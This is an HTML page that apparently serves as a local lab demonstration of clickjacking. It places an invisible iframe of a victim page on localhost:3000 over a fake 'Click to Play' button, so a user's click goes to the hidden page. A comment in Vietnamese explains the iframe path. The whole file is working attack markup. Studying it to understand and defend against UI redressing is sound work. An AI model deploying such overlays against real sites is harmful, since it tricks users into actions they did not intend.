<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Attacker Demo</title>
    <style>
        .wrapper {
            position: relative;
            width: 145px;
            height: 60px;
            overflow: hidden;
            margin: 100px auto;
            border: 2px dashed #666;
        }
        .wrapper iframe {
            position: absolute;
            top: -140px;
            left: -50px;
            width: 300px;
            height: 300px;
            border: none;
            opacity: 0;
        }
        .fake-btn {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #28a745;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            user-select: none;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <h2 style="text-align:center;">Attacker Page</h2>
    <div class="wrapper">
        <div class="fake-btn">▶ Click to Play</div>
        <!-- Chú ý: src phải là đường dẫn tuyệt đối đến Victim ở port 3000 -->
        <iframe src="http://localhost:3000/victim.html"></iframe>
    </div>
</body>
</html>
